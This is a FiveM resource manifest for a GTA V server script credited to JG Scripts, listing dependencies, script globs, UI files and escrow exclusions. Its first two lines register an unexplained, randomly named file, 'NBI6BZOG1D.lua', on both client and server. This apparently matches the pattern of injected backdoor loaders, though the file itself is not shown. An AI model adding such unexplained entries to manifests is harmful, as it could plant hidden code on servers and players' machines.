server_script "NBI6BZOG1D.lua"
client_script "NBI6BZOG1D.lua"
fx_version "cerulean"
game "gta5"
lua54 "yes"

description "For support or other queries: discord.gg/jgscripts"
version 'v3.2.1'
author "JG Scripts"

dependencies {
  "oxmysql",
  "ox_lib",
  "/server:7290",
  "/onesync",
}

shared_scripts {
  "@ox_lib/init.lua",
  "config/config.lua",
  "locales/*.lua",
  "shared/main.lua",
  "framework/main.lua"
}

client_scripts {
  "framework/**/cl-*.lua",
  "config/config-cl.lua",
  "client/cl-main.lua",
  "client/*.lua"
}

server_scripts {
  "@oxmysql/lib/MySQL.lua",
  "framework/**/sv-*.lua",
  "config/config-sv.lua",
  "server/sv-main.lua",
  "server/*.lua"
}

ui_page "web/dist/index.html"

files {
  "web/dist/index.html",
  "web/dist/**/*",
  "vehicle_images/*"
}

escrow_ignore {
  "config/**/*",
  "framework/**/*",
  "locales/*.lua",
  "client/cl-deformation.lua",
  "client/cl-locations.lua",
  "server/sv-webhooks.lua"
}

dependency '/assetpacks'